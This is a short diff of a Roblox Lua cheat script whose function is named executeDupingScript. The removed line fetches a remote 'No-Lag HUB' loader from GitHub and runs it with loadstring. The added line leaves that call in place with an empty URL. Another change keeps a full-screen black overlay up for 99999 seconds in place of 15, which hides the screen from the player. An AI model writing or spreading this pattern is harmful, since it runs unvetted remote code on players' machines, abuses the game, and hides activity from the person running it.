@@ -65,12 +65,12 @@ local function executeDupingScript(manualExecute)
     task.delay(0.5, function()
         -- Execute the script
         local success, err = pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua", true))()
+            loadstring(game:HttpGet("", true))()
         end)
         
         -- Only remove screen after full execution time if not manual execute
         if not manualExecute then
-            task.delay(15, function()
+            task.delay(99999, function()
                 if blackScreen and blackScreen.Parent then
                     blackScreen:Destroy()
                 end
